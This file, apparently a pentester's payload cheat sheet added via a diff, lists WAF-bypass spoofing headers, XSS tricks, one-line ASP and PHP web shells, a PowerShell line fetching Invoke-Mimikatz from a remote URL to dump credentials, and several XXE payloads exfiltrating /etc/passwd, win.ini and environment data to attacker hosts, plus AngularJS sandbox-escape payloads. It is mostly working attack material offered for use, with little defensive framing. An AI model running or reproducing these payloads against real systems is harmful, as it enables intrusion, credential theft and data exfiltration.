@@ -1,0 +1,205 @@
+#Waf bypass#
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+
+#wafbypass
+1) use <x & jump to event handler
+2) use onxxx=yyy & find number of x it accepts
+3) test them & change tag accordingly
+4) put js
+
+#angularjs security
+https://docs.google.com/presentation/d/1fBwDABfa2RdWxSFwadq8qD7soDIcqGzSvANkm1nlNas/pub?start=false&loop=false&delayms=3000&slide=id.g103580afa1_1_512
+
+#XSS mindmap
+https://github.com/xsuperbug/XSS.png
+
+#XSSI 
+http://sebastian-lekies.de/leak/
+
+#csrf token xss
+https://www.optiv.com/blog/bypassing-csrf-tokens-via-xss
+
+#ssrf
+http://www.xsses.com/2016/03/ssrf-in-imgur-worth-1600.html
+https://hackerone.com/reports/115978
+http://sethsec.blogspot.com.tr/2015/12/exploiting-server-side-request-forgery.html
+
+#Java DeS
+https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
+
+#browser filtre atlatma
+http://www.mbsd.jp/blog/20160407.html
+
+#hello burp
+<img style=display:none src=//burp/favicon.ico onload="7==Math.floor(Math.random()*10)&&alert(1)"> <!-- hello burp sometimes -->
+
+#Mimikatz#
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
+
+#FCKeditor#
+/FCKeditor/editor/filemanager/browser/default/browser.html
+/FCKeditor/editor/filemanager/browser/default/connectors/test.html
+/FCKeditor/editor/filemanager/connectors/uploadtest.html
+/FCKeditor/editor/filemanager/upload/test.html
+/fckeditor/editor/filemanager/browser/default/connectors/test.html
+/fckeditor/editor/filemanager/connectors/test.html
+
+#shell#
+ASPX: <%@ PageLanguage="Jscript"%>
+ASP : <%eval(Request.Item["cmd"],"unsafe");%>
+PHP: <?php @eval($_REQUEST["cmd"]); ?>
+
+#XXE#
+
+-----------
+
+--------------------------------------------------------------
+Vanilla, used to verify outbound xxe or blind xxe
+--------------------------------------------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
+]>
+<r>&sp;</r>
+
+---------------------------------------------------------------
+OoB extraction
+---------------------------------------------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+----------------------------------------------------------------
+OoB variation of above (seems to work better against .NET)
+----------------------------------------------------------------
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+%exfil;
+]>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+-----------------------------------------------------------------------
+OoB extra nice
+-----------------------------------------------------------------------
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY % start "<![CDATA[">
+ <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
+%dtd;
+]>
+<root>&all;</root>
+ 
+## External dtd: ##
+ 
+<!ENTITY all "%start;%stuff;%end;">
+
+------------------------------------------------------------------
+File-not-found exception based extraction
+------------------------------------------------------------------
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [  
+  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
+  %one;
+  %two;
+  %four;
+]>
+
+## External dtd: ##
+
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+
+-------------------------^ you might need to encode this % (depends on your target) as: &#x25;
+
+--------------
+FTP
+--------------
+<?xml version="1.0" ?>
+<!DOCTYPE a [ 
+<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
+%asd;
+%c;
+]>
+<a>&rrr;</a>
+
+
+## External dtd ##
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+
+---------------------------
+Inside SOAP body
+---------------------------
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+
+#angularjs
+http://jsfiddle.net/2zs2yv7o/209/
+
+<html>
+<head> 
+<meta charset="utf-8">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script>
+</head>
+<body>
+<!--
+    'a'.constructor.prototype.charAt=[].join;
+    $eval('x=alert(1)')
+-->
+<div ng-app>
+{{
+    ({}.toString()).constructor.prototype.charAt=[].join;
+ $eval(({}.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41))
+}}
+</div>
+</body>
+</html>
+
+#angularjs2
+https://jsfiddle.net/67zm6y4L/
+<!DOCTYPE html>
+<html ng-app="myApp">
+  <head>
+    <script src="https://code.angularjs.org/1.4.7/angular.js"></script>
+    <script src="https://cdn.rawgit.com/angular-translate/bower-angular-translate/2.9.0/angular-translate.js"></script>
+    <script>
+    var app = angular.module("myApp",['pascalprecht.translate']);
+        app.config(["$translateProvider",function($translateProvider){
+    }]);
+    app.controller("translateController" ,["$scope","$translate",function($scope,$translate){}]);
+    </script>
+  </head>
+
+  <body>
+    <div ng-controller="translateController">
+      <p>{{ "&#x7b;&#x7b;&apos;a&apos;.constructor.prototype.charAt=[].join;\&#x7d;\&#x7d;{{&apos;{{x=alert(1)\\}\\}&apos;|translate\}\}" | translate }}</p>
+    </div>
+  </body>
+</html>
